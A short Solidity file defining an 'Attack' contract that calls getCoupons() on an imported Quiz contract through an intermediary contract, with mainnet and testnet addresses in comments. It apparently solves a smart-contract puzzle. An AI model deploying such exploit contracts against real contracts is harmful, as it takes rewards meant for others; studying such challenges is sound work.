// SPDX-License-Identifier: MIT

//Mainnet contract address - 0x1e7421F1a1D898ac0267B92944FE06cB2b3e5762
//testnet-contract address - 0x385cAE1F3afFC50097Ca33f639184f00856928Ff

pragma solidity ^0.8.0;

import "./Quiz.sol";

contract Attack {
    Quiz public quiz;

    constructor(address _quiz) {
        quiz = Quiz(payable(_quiz));
    }

    function attack()external {
        quiz.getCoupons();
    }
}